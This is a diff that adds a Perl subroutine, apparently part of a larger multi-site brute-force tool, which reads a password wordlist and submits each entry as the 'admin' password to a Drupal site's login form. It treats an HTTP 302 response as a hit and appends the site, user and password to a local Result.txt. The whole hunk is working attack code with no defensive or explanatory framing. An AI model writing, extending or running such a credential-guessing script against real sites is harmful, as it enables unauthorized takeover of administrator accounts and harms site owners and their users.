@@ -340,3 +340,38 @@ next OUTER;
 }
 }
 }
+
+######DruPal#######
+sub drupal{
+print color('bold red'),"\n [";
+print color('bold green'),"-";
+print color('bold red'),"] ";
+print color('bold white'),"Starting brute force\n";
+open(a,"<$pass") or die "$!";
+while(<a>){
+chomp($_);
+$druser = admin;
+$drupass = $_;
+print color('bold red'),"\n [";
+print color('bold green'),"+";
+print color('bold red'),"] ";
+print color('bold white'),"Trying: $drupass ";
+
+$drupal = $site . '/user/login';
+$redirect = $site . '/user/1';
+
+$drupalbrute = POST $drupal, [name => $druser, pass => $drupass, form_build_id =>'', form_id => 'user_login',op => 'Log in', location => $redirect];
+$response = $ua->request($drupalbrute);
+$stat = $response->status_line;
+    if ($stat =~ /302/){
+print color('bold white'),"- ";
+print color('bold green'),"FOUND\n";
+print color('reset');
+
+open (TEXT, '>>Result.txt');
+print TEXT "$drupal => User: $druser Pass: $drupass\n";
+close (TEXT);
+next OUTER;
+}
+}
+}
